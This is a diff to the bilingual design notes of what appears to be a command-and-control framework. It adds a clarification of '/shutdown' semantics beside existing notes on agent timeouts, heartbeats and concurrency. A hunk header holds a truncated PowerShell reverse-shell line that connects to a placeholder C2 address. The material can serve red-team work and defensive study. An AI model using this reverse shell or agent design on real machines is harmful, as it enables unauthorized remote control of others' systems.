@@ -293,6 +293,7 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
   - `fail`：**保留连接**。当前 Job 报超时失败，并**清空该 Agent 的排队指令**；由于受控端上的命令可能仍在运行，C2 在它真正结束前（`Busy`）会拒绝新指令（直接报错、不再下发）。受控端返回后即可正常下发新指令。
     - **Native**：超时会重置该 Agent 的心跳计时（避免 watchdog 立即误踢），给一个 `native.heartbeat_timeout_sec` 的宽限窗口；若命令始终不返回，watchdog 到期仍会回收该 Agent。
     - **Shell**：无心跳/watchdog，若卡死命令永不返回，需由用户 `/shutdown` 关闭；关闭时会先写 `exit`，**1 秒内对端未关闭则强制断开连接**（Native 的 shutdown 同样带有 1 秒兜底强关）。
+- **Shutdown 语义**：`/shutdown` 成功仅表示关机请求已写入连接、本地 shutdown 流程完成（含 1 秒兜底强关）；**不代表受控端已确认收到或执行**。受控端执行状态不可知，Native 的 `ok` 应答也不作为成功确认。
 - **受控端并发**：Go / C 受控端将**心跳与指令执行分离到不同线程**（心跳独立发送，写操作按全局锁串行），因此执行长命令期间不会饿死心跳；执行超时按进程树终止，Go 另设 `WaitDelay` 兜底，C/Go 均启用 TCP keepalive。
 
 ### 14. 测试
@@ -602,6 +603,7 @@ range and base64-encodes it, or base64-decodes and appends a chunk), so both end
   - `fail`: **keep the connection**. The current job fails with a timeout and the agent's **queued jobs are discarded**; while the command may still be running, new jobs are rejected (reported as busy, not dispatched) until the controlled end finishes.
     - **Native**: the timeout resets the agent's heartbeat timer (so the watchdog does not drop it immediately), granting one `native.heartbeat_timeout_sec` grace window; if the command never returns, the watchdog still reclaims the agent.
     - **Shell**: no heartbeat/watchdog — if a stuck command never returns, the user must `/shutdown`; shutdown writes `exit` and **force-closes the connection after 1s** if the peer does not close (Native shutdown has the same 1s force-close fallback).
+- **Shutdown semantics**: a successful `/shutdown` means the request was written and the local shutdown procedure completed (including the 1s force-close); it does **not** confirm that the controlled end received or executed it. The Native `ok` reply is not used as confirmation.
 - **Controlled-end concurrency**: the Go / C agents run **heartbeats on a separate thread from command execution** (all writes serialized by a global lock), so a long command cannot starve heartbeats; timeouts kill the whole process tree, Go sets `WaitDelay`, and both enable TCP keepalive.
 
 ### 14. Tests
